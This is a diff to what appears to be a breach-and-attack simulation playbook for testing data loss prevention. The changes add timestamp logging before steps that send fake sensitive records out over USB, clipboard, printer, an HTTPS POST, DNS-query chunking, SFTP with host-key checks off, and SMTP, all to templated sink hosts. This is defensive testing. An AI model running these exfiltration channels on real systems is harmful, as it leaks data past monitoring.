@@ -98,6 +98,7 @@ steps:
         $csvContent = "[BAS-SIM-DLP] CustomerID,PAN,Aadhaar,SWIFT,UPI,CreditCard`nBAS-SIM-$runId,ABCDE1234F,123456789012,SBININBBXXX,fake.user@upi,4111111111111111"
         Set-Content -Path $srcFile -Value $csvContent -Encoding utf8
         $dest = "$($usbDrive.DriveLetter):\bas_sim_dlp_records_$runId.csv"
+        if ($env:BAS_TASK_ID) { Write-Output "DLP_EVENT_START: $env:BAS_TASK_ID $((Get-Date).ToUniversalTime().ToString('o'))" }
         Copy-Item -Path $srcFile -Destination $dest -ErrorAction SilentlyContinue
         if (Test-Path $dest) {
           Write-Output "EXEC T1052.001: multi-type sensitive record file copied to removable drive $($usbDrive.DriveLetter): unimpeded. [BAS-SIM-DLP-USB]"
@@ -138,6 +139,7 @@ steps:
       $csvContent = "[BAS-SIM-DLP] CustomerID,PAN,Aadhaar,SWIFT,UPI,CreditCard`nBAS-SIM-$runId,ABCDE1234F,123456789012,SBININBBXXX,fake.user@upi,4111111111111111"
       $originalClip = $null
       try { $originalClip = Get-Clipboard -Raw -ErrorAction SilentlyContinue } catch {}
+      if ($env:BAS_TASK_ID) { Write-Output "DLP_EVENT_START: $env:BAS_TASK_ID $((Get-Date).ToUniversalTime().ToString('o'))" }
       Set-Clipboard -Value $csvContent -ErrorAction SilentlyContinue
       Start-Sleep -Milliseconds 300
       $nowClip = $null
@@ -184,6 +186,7 @@ steps:
         $srcFile = Join-Path $env:TEMP "bas_sim_dlp_print_$runId.txt"
         Set-Content -Path $srcFile -Value $csvContent -Encoding utf8
         try {
+          if ($env:BAS_TASK_ID) { Write-Output "DLP_EVENT_START: $env:BAS_TASK_ID $((Get-Date).ToUniversalTime().ToString('o'))" }
           Get-Content -Path $srcFile | Out-Printer -Name $printer.Name -ErrorAction Stop
           Start-Sleep -Milliseconds 500
           $job = Get-PrintJob -PrinterName $printer.Name -ErrorAction SilentlyContinue | Where-Object { $_.DocumentName -match 'bas_sim_dlp_print' -or $_.JobStatus -match 'Printing|Spooling|Normal' } | Select-Object -First 1
@@ -273,6 +276,7 @@ steps:
       $dest = Join-Path $stagingDir "records_$runId.csv"
       try {
         New-Item -Path $stagingDir -ItemType Directory -Force -ErrorAction Stop | Out-Null
+        if ($env:BAS_TASK_ID) { Write-Output "DLP_EVENT_START: $env:BAS_TASK_ID $((Get-Date).ToUniversalTime().ToString('o'))" }
         Set-Content -Path $dest -Value $csvContent -Encoding utf8 -ErrorAction Stop
       } catch {}
       if (Test-Path $dest) {
@@ -310,6 +314,7 @@ steps:
       $ErrorActionPreference = 'SilentlyContinue'
       $csvContent = "[BAS-SIM-DLP] CustomerID,PAN,Aadhaar,SWIFT,UPI,CreditCard`nBAS-SIM-SINK,ABCDE1234F,123456789012,SBININBBXXX,fake.user@upi,4111111111111111"
       try {
+        if ($env:BAS_TASK_ID) { Write-Output "DLP_EVENT_START: $env:BAS_TASK_ID $((Get-Date).ToUniversalTime().ToString('o'))" }
         Invoke-RestMethod -Uri '{{SINK_URL}}' -Method Post -Body (@{token='{{SINK_TOKEN}}'; payload=$csvContent; channel='https-post'} | ConvertTo-Json) -ContentType 'application/json' -TimeoutSec 10 | Out-Null
         Write-Output "EXEC T1567: multi-type sensitive record POSTed over HTTPS. [BAS-SIM-DLP-SINK-HTTPS]"
       } catch {
@@ -365,6 +370,7 @@ steps:
       }
       $sent = 0
       try {
+        if ($env:BAS_TASK_ID) { Write-Output "DLP_EVENT_START: $env:BAS_TASK_ID $((Get-Date).ToUniversalTime().ToString('o'))" }
         nslookup "000.$($chunks.Count).{{SINK_DNS_CAMPAIGN_ID}}.{{SINK_DNS_DOMAIN}}" {{SINK_DNS_SERVER}} 2>&1 | Out-Null
         for ($i = 0; $i -lt $chunks.Count; $i++) {
           $seq = "{0:D3}" -f ($i + 1)
@@ -417,6 +423,7 @@ steps:
       $batchFile = New-TemporaryFile
       "put `"$($tempFile.FullName)`" `"$remoteFile`"" | Set-Content -Path $batchFile
       try {
+        if ($env:BAS_TASK_ID) { Write-Output "DLP_EVENT_START: $env:BAS_TASK_ID $((Get-Date).ToUniversalTime().ToString('o'))" }
         $output = & sftp.exe -oBatchMode=yes -oStrictHostKeyChecking=no -oUserKnownHostsFile=NUL -P {{SINK_SFTP_PORT}} -b $batchFile dlptest@{{SINK_SFTP_HOST}} 2>&1
         $exitCode = $LASTEXITCODE
         Write-Output "DLP_OBSERVATION: sftp_exit_code=$exitCode"
@@ -462,6 +469,7 @@ steps:
       $token = "{{SINK_TOKEN}}"
       $body = "$token`n$csvContent"
       try {
+        if ($env:BAS_TASK_ID) { Write-Output "DLP_EVENT_START: $env:BAS_TASK_ID $((Get-Date).ToUniversalTime().ToString('o'))" }
         Send-MailMessage -From "dlptest@sink.audspect.local" -To "dlptest@sink.audspect.local" `
           -Subject $token -Body $body `
           -SmtpServer "{{SINK_SMTP_HOST}}" -Port {{SINK_SMTP_PORT}} `
